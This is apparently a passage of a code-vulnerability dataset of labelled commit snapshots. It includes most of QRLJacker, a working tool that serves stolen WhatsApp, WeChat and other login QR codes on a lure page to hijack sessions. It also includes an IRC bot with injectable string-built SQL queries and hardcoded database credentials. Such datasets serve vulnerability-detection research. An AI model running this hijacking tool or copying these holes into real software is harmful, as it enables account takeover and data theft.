		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 1:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Airdroid()
			main()

	#Other Services
	if choice == 7:
		print """"""
 1.MyDigiPass
 2.Zapper
 3.Trustly App
 4.Yelophone
 5.Alibaba Yunos
 00.Back To Main Menu
""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Customization
	#if choice == 8:
		#settings.read(""Data/Simple.ini"")
		#url = settings.get(""WeChat"",""url"")
		#image_number = settings.get(""WeChat"",""image_number"")
		#classname = settings.get(""WeChat"",""classname"")
if __name__ == '__main__':
	main()
/n/n/n",0,command_injection
19,109,a101472db88764a0d031ef85fa283967b0692a77,"/QrlJacking-Framework/QRLJacker.py/n/n#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#Author:D4Vinci
import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparser
from selenium import webdriver
from binascii import a2b_base64
from PIL import Image

#settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name==""nt"":
			print "" [!] Serving files on ""+str(port)+"" port""
			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > NUL 2>&1"")
		else:
			print "" [!] Serving files on ""+str(port)+"" port""
			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > /dev/null 2>&1"")
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print "" [+]Opening Mozila FireFox...""
		return web
	except:
		web = webdriver.Chrome()
		print "" [+]Opening Google Chrome...""
		return web

#Stolen from stackoverflow :D
def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)#screenshot.png
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box) # defines crop points
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get('https://web.whatsapp.com/')
	time.sleep(5)

	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button = driver.find_element_by_class_name('qr-button')
			print "" [!]Clicking to reload QR code image...""
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace(""data:image/png;base64,"","""")
			print "" [+]The QR code image found !""
			print "" [+]Downloading the image..""
			binary_data = a2b_base64(src)
			qr = open(""tmp.png"",""wb"")
			qr.write(binary_data)
			print "" [#]Saved To tmp.png""
			qr.close()
			time.sleep(5)
			continue
		except:
			break

#make(""svg"")
def Yandex():
	print ""\n-- --- -- --- -- --- -- --- -- --- --""
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://passport.yandex.com/auth?mode=qr"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			img_url = ""https://passport.yandex.com"" + driver.find_element_by_class_name(""qr-code__i"").get_attribute(""style"").split(""\"""")[1].encode(""utf-8"")
			print "" [+]The QR code image found !""
			data = urllib.urlopen(img_url).read()
			print "" [+]Downloading the image..""
			f = open(""tmp.svg"",""w"").write(data)
			print "" [#]Saved To tmp.svg""
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def Airdroid():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://web.airdroid.com"")
	time.sleep(5)
	img_number = 16
	refresh = 0
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button = driver.find_element_by_class_name(""widget-login-refresh-qrcode"")[0]
			print "" [!]Clicking to reload QR code image...""
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[img_number]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			if refresh == 0:
				print "" [!]Refreshing page...""
				driver.refresh()
				refresh = 1
			img_number = 15
			continue
		except:
			break

def Weibo():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://weibo.com/login.php"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[len(imgs)-1]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def WeChat():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://web.wechat.com"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			continue
		except:
			break

def QQ():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://w.qq.com"")
	time.sleep(10)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name(""img"")[0]
			print "" [+]The QR code image found !""
			location = img.location
			size = img.size
			print "" [+]Grabbing photo..""
			Screenshot(""tmp.png"" ,location ,size)
			print "" [#]Saved To tmp.png""
			webdriver.delete_all_cookies()
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def Taobao():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://login.taobao.com"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button_class = web.find_element_by_class_name(""msg-err"")
			button = button_class.find_elements_by_tag_name(""a"")[0]
			print "" [!]Clicking to reload QR code image...""
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			continue
		except:
			break

def make(typ=""html""):
	if typ == ""html"":
		code = """"""<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src=""tmp.png?h=""+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<img id=""qrcodew"" alt=""Scan me!"" src=""tmp.png"" style=""display: block;""></center>
</body></html>""""""

	if typ == ""svg"":
		code = """"""<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src=""tmp.svg?h=""+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<object id=""qrcodew"" data=""tmp.svg"" type=""image/svg+xml""></object></center>
</body></html>""""""
	f = open(""index.html"",""w"")
	f.write(code)
	f.close()

def Simple_Exploit(classname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(url)

	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			login = driver.find_element_by_class_name(classname)
			img = login.find_elements_by_tag_name('img')[int(image_number)]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(s)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def clear():
	if os.name == ""nt"":
		os.system(""cls"")
	else:
		os.system(""clear"")

def main():
	#clear()
	print """"""\n
	  ___         _       _               _
	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
	| | | || '__|| |  _  | | / _` | / __|| |/ // _ \| '__|
	| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |
	 \__\_\|_|   |_|  \___/  \__,_| \___||_|\_\\___||_|

# Hacking With Qrljacking Attack Vector Become Easy
# Coded By karim Shoair | D4Vinci

 Vulnerable Web Applications and Services:
  1.Chat Applications
  2.Mailing Services
  3.eCommerce
  4.Online Banking
  5.Passport Services
  6.Mobile Management Software
  7.Other Services
  8.Customization
""""""
	choice = input("" Choice > "")

	#Chat Applications
	if choice == 1:
		print """"""
 1.WhatsApp
 2.WeChat
 3.Line
 4.Weibo
 5.QQ Instant Messaging
 00.Back To Main Menu
	""""""

		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		#Whatsapp
		elif int(choice_2) == 1:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			whatsapp()
			main()

		#Wechat
		elif int(choice_2) == 2:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			WeChat()
			main()

		#3

		#Weibo
		elif int(choice_2) == 4:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Weibo()
			main()

		elif int(choice_2) == 5:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			QQ()
			main()

	#Mailing Services
	if choice == 2:
		print """"""
 1.QQ Mail
 2.Yandex Mail
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 2:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make(""svg"")
			Serve_it(port)
			Yandex()
			main()

	#eCommerce
	if choice == 3:
		print """"""
 1.Alibaba
 2.Aliexpress
 3.Taobao
 4.Tmall
 5.1688.com
 6.Alimama
 7.Taobao Trips
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 3:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

		#4

		#5

		#6

		elif int(choice_2) == 7:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

	#Online Banking
	if choice == 4:
		print """"""
 1.AliPay
 2.Yandex Money
 3.TenPay
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Passport Services
	if choice == 5:
		print """"""
 1.Yandex Passport
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Mobile Management Software
	if choice == 6:
		print """"""
 1.Airdroid
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 1:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Airdroid()
			main()

	#Other Services
	if choice == 7:
		print """"""
 1.MyDigiPass
 2.Zapper
 3.Trustly App
 4.Yelophone
 5.Alibaba Yunos
 00.Back To Main Menu
""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Customization
	#if choice == 8:
		#settings.read(""Data/Simple.ini"")
		#url = settings.get(""WeChat"",""url"")
		#image_number = settings.get(""WeChat"",""image_number"")
		#classname = settings.get(""WeChat"",""classname"")
if __name__ == '__main__':
	main()
/n/n/n",1,command_injection
20,166,b551cd0cd87c3df45fc7787828f3bdd6422a7c72,"bot_sql.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import socket
import sys
import urllib2
import os
import time
from pysqlite2 import dbapi2 as sqlite

channel = '#masmorra'
nick = 'carcereiro'
server = 'irc.oftc.net' 

def sendmsg(msg): 
    sock.send('PRIVMSG '+ channel + ' :' + str(msg) + '\r\n')

class db():
	def __init__(self, dbfile):
		if not os.path.exists(dbfile):
			self.conn = sqlite.connect(dbfile)
			self.cursor = self.conn.cursor()
			self.create_table()
		self.conn = sqlite.connect(dbfile)
		self.cursor = self.conn.cursor()
	def close(self):
		self.cursor.close()
		self.conn.close()
	def create_table(self):
		self.cursor.execute('CREATE TABLE karma(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE url(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE slack(nome VARCHAR(30), total INTEGER, data DATE, PRIMARY KEY (data, nome));')
		self.conn.commit()
	def insert_karma(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO karma(nome,total) VALUES ('%s', %d );"" % (nome,total))
			self.conn.commit()
			return True
		except:
			#print ""Unexpected error:"", sys.exc_info()[0]
			return False
	def increment_karma(self,nome):
		if not self.insert_karma(nome,1):
			self.cursor.execute(""UPDATE karma SET total = total + 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def decrement_karma(self,nome):
		if not self.insert_karma(nome,-1):
			self.cursor.execute(""UPDATE karma SET total = total - 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def insert_url(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO url(nome,total) VALUES ('%s', %d );"" % (nome,total))
			self.conn.commit()
			return True
		except:
			return False
	def increment_url(self,nome):
		if not self.insert_url(nome,1):
			self.cursor.execute(""UPDATE url SET total = total + 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def insert_slack(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO slack(nome,total,data) VALUES ('%s', %d, '%s' );"" % (nome,total,time.strftime(""%Y-%m-%d"", time.localtime())))
			self.conn.commit()
			return True
		except:
			return False
	def increment_slack(self,nome,total):
		if not self.insert_slack(nome,total):
			self.cursor.execute(""UPDATE slack SET total = total + %d where nome = '%s' and data = '%s' ;"" % (total,nome,time.strftime(""%Y-%m-%d"", time.localtime())))
			self.conn.commit()
	def get_karmas_count(self):
		self.cursor.execute('SELECT nome,total FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0]) + ' = ' + str(linha[1])
			else:
				karmas = karmas + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return karmas
	def get_karmas(self):
		self.cursor.execute('SELECT nome FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0])
			else:	
				karmas = karmas + ', ' + (linha[0])
		return karmas
	def get_karma(self, nome):
		self.cursor.execute(""SELECT total FROM karma where nome = '%s'"" % (nome))
		for linha in self.cursor:
				return (linha[0])
	def get_urls_count(self):
		self.cursor.execute('SELECT nome,total FROM url order by total desc')
		urls = ''
		for linha in self.cursor:
			if len(urls) == 0:
				urls = (linha[0]) + ' = ' + str(linha[1])
			else:
				urls = urls + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return urls
	def get_slacker_count(self):
		self.cursor.execute(""SELECT nome,total FROM slack where data = '%s' order by total desc"" % (time.strftime(""%Y-%m-%d"", time.localtime())))
		slackers = ''
		for linha in self.cursor:
			if len(slackers) == 0:
				slackers = (linha[0]) + ' = ' + str(linha[1])
			else:
				slackers = slackers + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return slackers


class html:
	def __init__(self, url):
		self.url = url
		self.feed = None
		self.headers = {
	      'User-Agent' : 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10)',
   	   'Accept-Language' : 'pt-br,en-us,en',
      	'Accept-Charset' : 'utf-8,ISO-8859-1'
	   }
	def title(self):
		self.feed = self.get_data()
		title_pattern = re.compile(r""<[Tt][Ii][Tt][Ll][Ee]>(.*)</[Tt][Ii][Tt][Ll][Ee]>"", re.UNICODE)
		title_search = title_pattern.search(self.feed)
		if title_search is not None:
			try:
				return ""[ ""+re.sub(""&#?\w+;"", """", title_search.group(1) )+"" ]""
			except:
				print ""Unexpected error:"", sys.exc_info()[0]
				return ""[ Fail in parse ]""
	def get_data(self):
		try:
			reqObj = urllib2.Request(self.url, None, self.headers)
			urlObj = urllib2.urlopen(reqObj)
			return  urlObj.read(4096).strip().replace(""\n"","""").replace(""\r"", """")
		except:
			print ""Unexpected error:"", sys.exc_info()
			return ""<title>Fail in get</title>""


banco = db('carcereiro.db')
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server, 6667))
sock.send('NICK %s \r\n' % nick)
sock.send('USER %s \'\' \'\' :%s\r\n' % (nick, 'python'))
sock.send('JOIN %s \r\n' % channel)



while True:
	buffer = sock.recv(2040)
	if not buffer:
		break
	print buffer

	if buffer.find('PING') != -1: 
		sock.send('PONG ' + buffer.split() [1] + '\r\n')

	if re.search(':[!@]help', buffer, re.UNICODE) is not None or re.search(':'+nick+'[ ,:]+help', buffer, re.UNICODE) is not None:
		sendmsg('@karmas, @urls, @slackers\r\n')

	regexp  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\+\+', re.UNICODE)
	regexm  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\-\-', re.UNICODE)
	regexk  = re.compile('PRIVMSG.*:karma ([a-z_\-\.]+)', re.UNICODE)
	regexu  = re.compile('PRIVMSG.*[: ]\@urls', re.UNICODE)
	regexs  = re.compile('PRIVMSG.*[: ]\@slackers', re.UNICODE)
	regexks = re.compile('PRIVMSG.*[: ]\@karmas', re.UNICODE)
	regexslack  = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG.* :(.*)$', re.UNICODE)
	pattern_url   = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG .*(http://[áéíóúÁÉÍÓÚÀàa-zA-Z0-9_?=./,\-\+\'~]+)', re.UNICODE)
	
	resultp  = regexp.search(buffer)
	resultm  = regexm.search(buffer)
	resultk  = regexk.search(buffer)
	resultu  = regexu.search(buffer)
	results  = regexs.search(buffer)
	resultks = regexks.search(buffer)
	resultslack = regexslack.search(buffer)
	url_search = pattern_url.search(buffer)

	if resultslack is not None:
		var = len(resultslack.group(2)) - 1
		nick = resultslack.group(1)
		banco.increment_slack(nick,var)

	if resultp is not None:
		var = resultp.group(1)
		banco.increment_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultm is not None:
		var = resultm.group(1)
		banco.decrement_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultk is not None:
		var = resultk.group(1)
		points = banco.get_karma(var)
		if points is not None:
			sendmsg(var + ' have ' + str(points) + ' points of karma')
		else:
			sendmsg(var + ' doesn\'t have any point of karma')
		continue

	if resultks is not None:
		sendmsg('karmas : ' + banco.get_karmas_count())
		continue
	
	if results is not None:
		sendmsg('slackers in chars : ' + banco.get_slacker_count())
		continue

	if resultu is not None:
		sendmsg('users : ' + banco.get_urls_count())
		continue
	
	if url_search is not None:
		try:
			url  = url_search.group(2)
			nick = url_search.group(1)
			parser = html(url)
			sendmsg(  parser.title() )
			banco.increment_url( nick )
		except:
			sendmsg('[ Failed ]')
			print url
			print ""Unexpected error:"", sys.exc_info()[0]

sock.close()
banco.close()
/n/n/n",0,command_injection
21,167,b551cd0cd87c3df45fc7787828f3bdd6422a7c72,"/bot_sql.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import socket
import sys
import urllib2
import os
import time
from pysqlite2 import dbapi2 as sqlite

channel = '#masmorra'
nick = 'carcereiro'
server = 'irc.oftc.net' 

def sendmsg(msg): 
    sock.send('PRIVMSG '+ channel + ' :' + str(msg) + '\r\n')

class db():
	def __init__(self, dbfile):
		if not os.path.exists(dbfile):
			self.conn = sqlite.connect(dbfile)
			self.cursor = self.conn.cursor()
			self.create_table()
		self.conn = sqlite.connect(dbfile)
		self.cursor = self.conn.cursor()
	def close(self):
		self.cursor.close()
		self.conn.close()
	def create_table(self):
		self.cursor.execute('CREATE TABLE karma(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE url(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE slack(nome VARCHAR(30), total INTEGER, data DATE, PRIMARY KEY (data, nome));')
		self.conn.commit()
	def insert_karma(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO karma(nome,total) VALUES ('%s', %d );"" % (nome,total))
			self.conn.commit()
			return True
		except:
			#print ""Unexpected error:"", sys.exc_info()[0]
			return False
	def increment_karma(self,nome):
		if not self.insert_karma(nome,1):
			self.cursor.execute(""UPDATE karma SET total = total + 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def decrement_karma(self,nome):
		if not self.insert_karma(nome,-1):
			self.cursor.execute(""UPDATE karma SET total = total - 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def insert_url(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO url(nome,total) VALUES ('%s', %d );"" % (nome,total))
			self.conn.commit()
			return True
		except:
			return False
	def increment_url(self,nome):
		if not self.insert_url(nome,1):
			self.cursor.execute(""UPDATE url SET total = total + 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def insert_slack(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO slack(nome,total,data) VALUES ('%s', %d, '%s' );"" % (nome,total,time.strftime(""%Y-%m-%d"", time.localtime())))
			self.conn.commit()
			return True
		except:
			return False
	def increment_slack(self,nome,total):
		if not self.insert_slack(nome,total):
			self.cursor.execute(""UPDATE slack SET total = total + %d where nome = '%s' and data = '%s' ;"" % (total,nome,time.strftime(""%Y-%m-%d"", time.localtime())))
			self.conn.commit()
	def get_karmas_count(self):
		self.cursor.execute('SELECT nome,total FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0]) + ' = ' + str(linha[1])
			else:
				karmas = karmas + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return karmas
	def get_karmas(self):
		self.cursor.execute('SELECT nome FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0])
			else:	
				karmas = karmas + ', ' + (linha[0])
		return karmas
	def get_karma(self, nome):
		self.cursor.execute(""SELECT total FROM karma where nome = '%s'"" % (nome))
		for linha in self.cursor:
				return (linha[0])
	def get_urls_count(self):
		self.cursor.execute('SELECT nome,total FROM url order by total desc')
		urls = ''
		for linha in self.cursor:
			if len(urls) == 0:
				urls = (linha[0]) + ' = ' + str(linha[1])
			else:
				urls = urls + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return urls
	def get_slacker_count(self):
		self.cursor.execute(""SELECT nome,total FROM slack where data = '%s' order by total desc"" % (time.strftime(""%Y-%m-%d"", time.localtime())))
		slackers = ''
		for linha in self.cursor:
			if len(slackers) == 0:
				slackers = (linha[0]) + ' = ' + str(linha[1])
			else:
				slackers = slackers + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return slackers


class html:
	def __init__(self, url):
		self.url = url
		self.feed = None
		self.headers = {
	      'User-Agent' : 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10)',
   	   'Accept-Language' : 'pt-br,en-us,en',
      	'Accept-Charset' : 'utf-8,ISO-8859-1'
	   }
	def title(self):
		self.feed = self.get_data()
		title_pattern = re.compile(r""<[Tt][Ii][Tt][Ll][Ee]>(.*)</[Tt][Ii][Tt][Ll][Ee]>"", re.UNICODE)
		title_search = title_pattern.search(self.feed)
		if title_search is not None:
			try:
				return ""[ ""+re.sub(""&#?\w+;"", """", title_search.group(1) )+"" ]""
			except:
				print ""Unexpected error:"", sys.exc_info()[0]
				return ""[ Fail in parse ]""
	def get_data(self):
		try:
			reqObj = urllib2.Request(self.url, None, self.headers)
			urlObj = urllib2.urlopen(reqObj)
			return  urlObj.read(4096).strip().replace(""\n"","""")
		except:
			print ""Unexpected error:"", sys.exc_info()
			return ""<title>Fail in get</title>""


banco = db('carcereiro.db')
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server, 6667))
sock.send('NICK %s \r\n' % nick)
sock.send('USER %s \'\' \'\' :%s\r\n' % (nick, 'python'))
sock.send('JOIN %s \r\n' % channel)



while True:
	buffer = sock.recv(2040)
	if not buffer:
		break
	print buffer

	if buffer.find('PING') != -1: 
		sock.send('PONG ' + buffer.split() [1] + '\r\n')

	if re.search(':[!@]help', buffer, re.UNICODE) is not None or re.search(':'+nick+'[ ,:]+help', buffer, re.UNICODE) is not None:
		sendmsg('@karmas, @urls, @slackers\r\n')

	regexp  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\+\+', re.UNICODE)
	regexm  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\-\-', re.UNICODE)
	regexk  = re.compile('PRIVMSG.*:karma ([a-z_\-\.]+)', re.UNICODE)
	regexu  = re.compile('PRIVMSG.*[: ]\@urls', re.UNICODE)
	regexs  = re.compile('PRIVMSG.*[: ]\@slackers', re.UNICODE)
	regexks = re.compile('PRIVMSG.*[: ]\@karmas', re.UNICODE)
	regexslack  = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG.* :(.*)$', re.UNICODE)
	pattern_url   = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG .*(http://[áéíóúÁÉÍÓÚÀàa-zA-Z0-9_?=./,\-\+\'~]+)', re.UNICODE)
	
	resultp  = regexp.search(buffer)
	resultm  = regexm.search(buffer)
	resultk  = regexk.search(buffer)
	resultu  = regexu.search(buffer)
	results  = regexs.search(buffer)
	resultks = regexks.search(buffer)
	resultslack = regexslack.search(buffer)
	url_search = pattern_url.search(buffer)

	if resultslack is not None:
		var = len(resultslack.group(2)) - 1
		nick = resultslack.group(1)
		banco.increment_slack(nick,var)

	if resultp is not None:
		var = resultp.group(1)
		banco.increment_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultm is not None:
		var = resultm.group(1)
		banco.decrement_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultk is not None:
		var = resultk.group(1)
		points = banco.get_karma(var)
		if points is not None:
			sendmsg(var + ' have ' + str(points) + ' points of karma')
		else:
			sendmsg(var + ' doesn\'t have any point of karma')
		continue

	if resultks is not None:
		sendmsg('karmas : ' + banco.get_karmas_count())
		continue
	
	if results is not None:
		sendmsg('slackers in chars : ' + banco.get_slacker_count())
		continue

	if resultu is not None:
		sendmsg('users : ' + banco.get_urls_count())
		continue
	
	if url_search is not None:
		try:
			url  = url_search.group(2)
			nick = url_search.group(1)
			parser = html(url)
			sendmsg(  parser.title() )
			banco.increment_url( nick )
		except:
			sendmsg('[ Failed ]')
			print url
			print ""Unexpected error:"", sys.exc_info()[0]

sock.close()
banco.close()
/n/n/n",1,command_injection
22,28,8076b9475ed007a4d0e5d10c9b6938f72f5d35a5,"Server/model.py/n/nfrom mysql_commands import *

def select_all_apps():
	return select_row_from_mysql_command(""SELECT * FROM apps"")

def select_all_apps_from_user(user_id):
	return select_row_from_mysql_command(""SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?"", user_id)

def select_all_devices_from_user(user_id):
	return select_row_from_mysql_command(""SELECT * FROM devices WHERE user_id=?"", user_id)/n/n/nServer/mysql_commands.py/n/nimport sqlalchemy
from sqlalchemy import text
from sqlalchemy.orm import sessionmaker, scoped_session

engine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')
Session = scoped_session(sessionmaker(bind=engine))

s = Session()

def select_row_from_mysql_command(command_str):
    ''' function for selecting a specific row  '''
    ''' OUPUT: a list of elements in the selected row '''

    sql = text(str(command_str))
    return s.execute(sql).fetchall()


def insert_into_mysql_command(command_str):
        ''' the function inserts data depending from a command_str '''

        sql = text(str(command_str))
        s.execute(sql)
        s.commit()
/n/n/n",0,command_injection
23,29,8076b9475ed007a4d0e5d10c9b6938f72f5d35a5,"/Server/model.py/n/nimport sqlalchemy
from sqlalchemy import text
from sqlalchemy.orm import sessionmaker, scoped_session

engine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')
Session = scoped_session(sessionmaker(bind=engine))

def select_all_apps():
	return s.execute(""SELECT * FROM apps"").fetchall()

def select_all_apps_from_user(user_id):
	return s.execute(""SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?"", user_id)

def select_all_devices_from_user(user_id):
	return s.execute(""SELECT * FROM devices WHERE user_id=?"", user_id)/n/n/n",1,command_injection
24,190,b3683453b29eba54aca6d04cd8a717429257c0fc,"contrib/node/src/python/pants/contrib/node/subsystems/node_distribution.py/n/n# coding=utf-8
# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import (absolute_import, division, generators, nested_scopes, print_function,
                        unicode_literals, with_statement)

import logging
import os
import subprocess
from collections import namedtuple

from pants.base.exceptions import TaskError
from pants.binaries.binary_util import BinaryUtil
